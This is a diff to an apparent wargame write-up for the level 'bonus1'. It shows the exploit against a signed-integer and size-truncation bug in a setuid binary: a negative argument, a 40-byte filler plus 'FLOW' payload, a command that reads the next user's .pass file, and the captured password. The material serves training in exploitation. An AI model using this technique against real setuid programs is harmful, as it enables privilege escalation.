@@ -4,37 +4,32 @@ bonus1 - walkthrough
 Target: /home/user/bonus1/bonus1   (setuid + setgid bonus2)
 Goal:   read /home/user/bonus2/.pass
 
-1. Recon (objdump -d bonus1), main():
+1. The bug (signedness + truncation)
+   main():
      n = atoi(argv[1]);            ; stored at esp+0x3c
-     if (n > 9) return 1;          ; SIGNED compare (jle) -> only blocks n>9
+     if (n > 9) return 1;          ; SIGNED compare -> only blocks n > 9
      memcpy(esp+0x14, argv[2], n*4);
-     if (n == 0x574f4c46) execl("/bin/sh", "sh", NULL);
-   Strings: execl("/bin/sh","sh",NULL)  (0x8048583 / 0x8048580).
-   0x574f4c46 spelled little-endian is "FLOW".
+     if (n == 0x574f4c46) execl("/bin/sh", "sh", NULL);   ; 0x574f4c46 = "FLOW"
+   n is signed, so a NEGATIVE n passes "n > 9". The copy size n*4 is computed in
+   32 bits and handed to memcpy as an unsigned size_t.
 
-2. The bug (signedness + truncation)
-   n is a signed int, so a NEGATIVE n passes "n > 9". The size passed to
-   memcpy is n*4, computed in 32 bits then used as an unsigned size_t.
-   We want:
-     (a) n <= 9  (signed)                 -> pass the check
-     (b) n*4 (mod 2^32) = a small size     -> a survivable, useful copy length
-     (c) enough bytes to overwrite the stored n at esp+0x3c
+2. Offset (read straight from the disassembly)
+   buf = esp+0x14, stored n = esp+0x3c -> 0x3c - 0x14 = 40 bytes apart. To
+   overwrite all 4 bytes of n we need memcpy to copy 44 bytes.
 
-   The buffer is esp+0x14; the stored n is esp+0x3c, i.e. 40 bytes in. So we
-   need to copy at least 44 bytes and put our value at offset 40.
+3. Pick n so that n*4 = 44
+     n = (44 - 2^32) / 4 = -1073741813  (0xC000000B)
+   As a signed int it is <= 9 (passes the check); n*4 truncated to 32 bits = 44.
 
-   Pick n = -1073741813 = 0xC000000B:
-     signed value <= 9                     -> OK
-     n*4 = 0xC000000B << 2 = 0x2C = 44      (top two bits shift out)
-   memcpy copies 44 bytes; bytes 40..43 overwrite the stored n.
-
-3. Payload
-   argv[1] = "-1073741813"
-   argv[2] = "A"*40 + "FLOW"        (44 bytes; offset 40 = 0x574f4c46)
+4. Payload  (Ressources/exploit.py)
+     argv[1] = "-1073741813"
+     payload = b"A"*40 + b"FLOW"      # 44 bytes; the "FLOW" lands on n at offset 40
    After memcpy, n == 0x574f4c46 -> execl("/bin/sh","sh",NULL).
 
-     $ echo 'cat /home/user/bonus2/.pass' | \
-         ./bonus1 -1073741813 "$(python -c 'print "A"*40 + "FLOW"')"
+5. Run
+     $ python3 Ressources/exploit.py
+     $ echo 'cat /home/user/bonus2/.pass' | ./bonus1 -1073741813 "$(cat payload)"
+   execl spawns /bin/sh, which runs the piped command.
 
-4. Result -- bonus2 password:
+6. Result -- bonus2 password:
    579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
